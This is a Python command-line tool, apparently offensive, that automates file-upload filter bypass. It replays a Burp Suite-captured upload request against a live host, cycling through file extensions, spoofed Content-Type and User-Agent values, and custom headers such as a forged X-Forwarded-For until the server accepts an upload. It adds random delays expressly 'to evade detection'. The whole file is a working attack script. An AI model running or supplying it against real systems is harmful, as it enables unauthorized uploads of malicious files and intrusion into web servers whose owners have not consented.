import argparse
import os
import requests
import time
import random
from tqdm import tqdm  # Import tqdm for the progress bar

# ANSI escape codes for colored output
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Display tool banner
def display_banner():
    print(r"""
/==============================================================================\
||                                                                            ||
||      _   _       _                 _ _                                     ||
||     | | | |_ __ | | ___   __ _  __| | |__  _   _ _ __   __ _ ___ ___       ||
||     | | | | '_ \| |/ _ \ / _` |/ _` | '_ \| | | | '_ \ / _` / __/ __|      ||
||     | |_| | |_) | | (_) | (_| | (_| | |_) | |_| | |_) | (_| \__ \__ \      ||
||      \___/| .__/|_|\___/ \__,_|\__,_|_.__/ \__, | .__/ \__,_|___|___/      ||
||           |_|                              |___/|_|                        ||
||                                                                            ||
\==============================================================================/
""")

# Read Burp Suite captured data
def read_raw_request(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        return f.read().strip()

# Read payload file content
def read_payload_file(file_path):
    if file_path and os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return []

# Parse HTTP request
def parse_raw_request(raw_data):
    lines = raw_data.split("\n")
    method, path, _ = lines[0].split()
    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        if line.strip() == "":
            is_body = True
            continue
        if is_body:
            body += line + "\n"
        else:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

    return method, path, headers, body.strip()

# Modify HTTP request
def modify_request(method, headers, body, content_type, user_agent, file_extension, custom_headers):
    """Modify the HTTP request headers and body by replacing '*' with different file extensions."""
    modified_headers = headers.copy()

    if content_type:
        modified_headers["Content-Type"] = content_type
    
    if user_agent:
        modified_headers["User-Agent"] = user_agent
    
    for header in custom_headers:
        key, value = header.split(":", 1)
        modified_headers[key.strip()] = value.strip()

    modified_body = body.replace("*", file_extension)
    
    return modified_headers, modified_body

# Send HTTP request with delay and progress bar
def send_request(method, url, headers, body, file_extension, content_type, user_agent, delay):
    if delay is None:
        delay = random.uniform(2, 5)  # 默认 2-5 秒随机延迟
    
    print(f"{BLUE}[*] Sleeping for {delay:.2f} seconds to evade detection...{RESET}")
    time.sleep(delay)  # 施加延迟
    
    print(f"{BLUE}[*] Attempting upload with extension: {file_extension}{RESET}")
    print(f"[*] Content-Type: {content_type}")
    print(f"[*] User-Agent: {user_agent}")
    print(f"[*] Request Method: {method}")
    print(f"[*] Request URL: {url}")
    print(f"[*] Headers: {headers}")
    print(f"[*] Body (first 200 chars): {body[:200]}")

    try:
        response = requests.request(method, url, headers=headers, data=body, timeout=10)
        if response.status_code == 200:
            print(f"{GREEN}[+] Successfully uploaded file with extension: {file_extension}!{RESET}")
        else:
            print(f"{RED}[!] Upload failed with status code: {response.status_code}{RESET}")
        
        print(f"[+] Response Content:\n{response.text[:200]}...")
        return response.status_code
    except requests.RequestException as e:
        print(f"{RED}[!] Request Failed: {e}{RESET}")
        return None

# Main function
def main():
    display_banner()

    parser = argparse.ArgumentParser(
        description="File Upload Bypass Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("-r", "--raw", required=True, help="Specify the HTTP request file captured by Burp Suite/Wireshark with * marking the fields that need testing")
    parser.add_argument("--content-type", help="Specify spoofed Content-Type file")
    parser.add_argument("--user-agent", help="Specify spoofed User-Agent file")
    parser.add_argument("--extensions", required=True, help="File containing test file extensions")
    parser.add_argument("--custom-header", action="append", help="Add custom headers (e.g., 'X-Forwarded-For: 127.0.0.1')")
    parser.add_argument("--time", type=float, help="Specify delay time in seconds between requests (default: random 2-5s)")
    
    args = parser.parse_args()
    
    raw_data = read_raw_request(args.raw)
    method, path, headers, body = parse_raw_request(raw_data)
    base_url = f"http://{headers['Host']}{path}"

    provided_content_types = read_payload_file(args.content_type)
    provided_user_agents = read_payload_file(args.user_agent)
    file_extensions = read_payload_file(args.extensions)

    burp_content_type = headers.get("Content-Type", "application/octet-stream")
    burp_user_agent = headers.get("User-Agent", "Mozilla/5.0")

    content_types = provided_content_types if provided_content_types else [burp_content_type]
    user_agents = provided_user_agents if provided_user_agents else [burp_user_agent]

    custom_headers = args.custom_header if args.custom_header else []
    delay = args.time  # 获取用户自定义延迟时间

    print("[*] Testing different extensions for bypass...")
    
    total_tests = len(file_extensions) * len(content_types) * len(user_agents)
    with tqdm(total=total_tests, desc="Testing Upload Bypass", unit="test") as progress_bar:
        for file_extension in file_extensions:
            for content_type in content_types:
                for user_agent in user_agents:
                    modified_headers, modified_body = modify_request(method, headers, body, content_type, user_agent, file_extension, custom_headers)
                    status_code = send_request(method, base_url, modified_headers, modified_body, file_extension, content_type, user_agent, delay)
                    progress_bar.update(1)
                    print("\n==============================")
                    if status_code == 200:
                        return

    print("[*] Testing complete!")

if __name__ == "__main__":
    main()
